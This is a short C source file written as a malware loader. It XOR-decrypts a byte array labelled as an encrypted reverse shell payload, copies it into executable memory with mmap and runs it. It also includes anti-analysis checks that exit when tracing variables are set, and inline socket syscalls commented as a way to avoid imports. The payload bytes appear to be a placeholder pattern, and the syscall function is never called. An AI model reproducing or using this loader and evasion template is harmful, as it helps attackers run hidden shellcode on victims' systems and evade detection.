#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>

// Simple XOR "encryption" (simulating AES)
void decrypt_payload(unsigned char *payload, int len, unsigned char *key) {
    for(int i = 0; i < len; i++) {
        payload[i] ^= key[i % 16];
    }
}

// Encrypted reverse shell payload
unsigned char encrypted_payload[] = {
    0x8c, 0x9f, 0x8d, 0x9e, 0x8a, 0x9b, 0x89, 0x98,
    0x86, 0x97, 0x85, 0x94, 0x82, 0x93, 0x81, 0x90,
    0xac, 0xbf, 0xad, 0xbe, 0xaa, 0xbb, 0xa9, 0xb8,
    0xa6, 0xb7, 0xa5, 0xb4, 0xa2, 0xb3, 0xa1, 0xb0,
    0x7c, 0x6f, 0x7d, 0x6e, 0x7a, 0x6b, 0x79, 0x68,
    0x76, 0x67, 0x75, 0x64, 0x72, 0x63, 0x71, 0x60
};

unsigned char key[] = {
    0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe,
    0xde, 0xad, 0xbe, 0xef, 0xca, 0xfe, 0xba, 0xbe
};

void hide_imports() {
    // Manual syscalls to avoid imports
    asm volatile(
        "mov $41, %%rax\n"  // socket syscall
        "mov $2, %%rdi\n"   // AF_INET
        "mov $1, %%rsi\n"   // SOCK_STREAM
        "xor %%rdx, %%rdx\n"
        "syscall\n"
        : : : "rax", "rdi", "rsi", "rdx"
    );
}

int main() {
    // Anti-analysis checks
    if (getenv("STRACE") || getenv("LT_TRACE")) {
        return 0;
    }
    
    // Decrypt payload
    decrypt_payload(encrypted_payload, sizeof(encrypted_payload), key);
    
    // Copy to executable memory
    void *exec_mem = mmap(NULL, sizeof(encrypted_payload), 
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_ANON | MAP_PRIVATE, -1, 0);
    memcpy(exec_mem, encrypted_payload, sizeof(encrypted_payload));
    
    // Execute
    void (*shell)() = exec_mem;
    shell();
    
    return 0;
}